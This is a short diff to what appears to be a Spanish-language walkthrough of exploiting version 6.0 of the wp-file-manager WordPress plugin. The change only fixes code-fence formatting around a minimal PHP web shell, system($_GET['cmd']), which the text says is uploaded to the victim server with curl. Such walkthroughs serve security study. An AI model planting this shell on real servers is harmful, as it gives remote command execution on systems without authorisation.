@@ -212,11 +212,11 @@ Si buscamos información sobre la versión 6.0 del plugin wp-file-manager vemos 
 
 Para explotar esta vulnerabilidad lo primero que tenems que hacer es crear una shell PHP mínima para poder subir a la máquina víctima:
 
-´´´PHP
+```php
 <?php
   system($_GET['cmd']);
 ?>
-´´´
+```
 
 Una vez tenemos el payload que vamos a subir, mediante curl lo subimos al servidor:
 
